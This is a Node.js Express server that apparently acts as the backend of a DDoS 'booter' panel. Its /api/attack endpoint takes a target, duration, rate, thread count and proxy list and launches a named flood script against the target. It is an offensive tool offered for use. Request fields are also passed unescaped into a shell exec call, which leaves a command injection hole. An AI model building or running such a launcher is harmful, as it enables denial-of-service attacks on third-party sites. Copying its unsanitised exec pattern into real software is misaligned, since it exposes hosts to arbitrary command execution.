const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const app = express();

// Use a custom port for local development, fallback to Railway's PORT
const port = process.env.PORT || 8080;

// Middleware to parse JSON and serve static files
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Serve index.html explicitly for the root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// API endpoint to handle the attack command
app.post('/api/attack', (req, res) => {
    const {
        method = 'kill',
        target,
        time = 260,
        rate = 25,
        threads = 10,
        proxyfile = 'prx.txt'
    } = req.body;

    // Validate required target parameter
    if (!target) {
        return res.status(400).json({ error: 'Target is required' });
    }

    // Construct the command
    const command = `node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`;

    // Execute the command
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${error.message}`);
            return res.status(500).json({ error: 'Command execution failed', details: error.message });
        }
        if (stderr) {
            console.error(`Command stderr: ${stderr}`);
            return res.status(500).json({ error: 'Command error', details: stderr });
        }
        res.json({ message: 'Command executed successfully', output: stdout });
    });
});

// Start the server
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
